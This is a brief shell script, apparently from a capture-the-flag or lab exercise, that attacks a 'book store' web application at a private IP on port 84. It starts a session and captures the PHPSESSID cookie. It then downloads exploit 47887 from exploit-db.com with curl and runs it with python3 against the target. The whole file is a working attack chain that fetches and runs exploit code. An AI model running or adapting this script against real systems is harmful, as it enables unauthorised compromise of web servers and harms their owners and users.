#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.68.196"
attack_ip="10.10.190.240"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:84" -c "/work/6-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/6-cookies.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Retrieve exploit script for book store
echo "2 - RETRIEVING EXPLOIT SCRIPT"
curl -s -X GET https://www.exploit-db.com/download/47887 -o /work/6-47887.py

# Perform exploit
echo "3 - PERFORMING EXPLOIT"
python3 /work/6-47887.py http://$target_ip:84

